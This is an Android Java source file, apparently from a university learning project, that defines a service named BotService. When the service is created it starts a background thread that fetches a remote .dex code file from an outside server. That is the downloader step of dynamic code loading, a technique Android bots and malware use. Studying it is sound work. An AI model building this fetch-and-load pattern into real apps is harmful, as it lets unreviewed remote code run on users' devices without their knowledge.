package edu.ntu.android.learning.dynamicactivitychange;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

public class BotService extends Service {

    public Context mContext;
    public BotService() {

        mContext = this;

        new Thread(new Runnable() {
            @Override
            public void run() {
                Utils.queryServer(mContext, "http://pat.sce.ntu.edu.sg/android/classes/a.dex", 1);
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
